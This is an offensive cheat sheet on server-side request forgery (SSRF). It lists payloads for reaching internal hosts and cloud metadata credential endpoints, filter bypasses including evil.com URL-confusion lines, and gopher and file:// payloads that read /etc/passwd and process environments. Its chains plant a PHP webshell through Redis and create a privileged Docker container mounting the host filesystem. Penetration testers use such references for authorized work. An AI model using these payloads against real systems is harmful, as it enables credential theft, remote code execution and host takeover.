# Server-Side Request Forgery (SSRF)

## Detection

Look for parameters that cause the server to fetch a URL:
`url=`, `page=`, `img=`, `src=`, `redirect=`, `callback=`,
`next=`, `ref=`, `feed=`, `webhook=`.

## Internal Targets

```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://0177.0.0.1          # octal
http://2130706433           # decimal (127.0.0.1)
http://0x7f000001           # hex
http://127.1                # short form
```

## Cloud Metadata Endpoints

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
# Requires: Metadata-Flavor: Google header

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires: Metadata: true header

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

## Filter Bypass

| Filter | Bypass |
|---|---|
| IP address blocked | DNS rebinding, domain → 127.0.0.1 |
| `127.0.0.1` blocked | `0x7f000001`, `2130706433`, `017700000001`, `127.1` |
| `localhost` blocked | `127.0.0.1`, `[::1]`, `localtest.me` (resolves to 127.0.0.1) |
| HTTP scheme only | `gopher://`, `file:///`, `dict://`, `ftp://` |
| Specific port blocked | Use `@` redirect: `http://attacker@127.0.0.1:8080` |
| Domain whitelist | Open redirect on whitelisted domain, DNS rebinding |
| URL parsing confusion | `http://evil.com#@good.com`, `http://good.com@evil.com` |

## DNS Rebinding

**How**: Register a domain that alternates between your server IP and
the target internal IP. The first DNS resolution passes the filter,
the second (when the request is made) hits the internal target.

Tools: `rbndr.us`, `nip.io` (e.g., `127.0.0.1.nip.io`),
custom DNS server with short TTL.

## Protocol Smuggling

### Gopher Protocol

```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a
```

Gopher allows sending raw TCP data — use to interact with
Redis, MySQL, SMTP, FastCGI, or any TCP service.

```python
# Generate gopher payload for Redis
import urllib.parse
payload = "*1\r\n$4\r\nPING\r\n"
gopher = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)
```

### file:// Protocol

```
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
```

## SSRF Chains

### SSRF → Redis RCE

```
# Write webshell via Redis
gopher://127.0.0.1:6379/_
SET shell "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SAVE
```

### SSRF → Docker API

```
# List containers
http://127.0.0.1:2375/containers/json

# Create privileged container with host mount
POST http://127.0.0.1:2375/containers/create
{"Image":"alpine","Cmd":["sh"],"Binds":["/:/host"],"Privileged":true}
```

### SSRF → Internal Admin Panel

```
# Access admin on internal-only port
http://127.0.0.1:8080/admin
http://127.0.0.1:3000/admin/settings
```

## Partial SSRF

**When**: You control only part of the URL (e.g., path or parameter).

- Path injection: if URL is `http://api.internal/{user_input}`,
  try `../admin` or `@evil.com`
- Header injection: CRLF in URL → inject headers for metadata endpoints
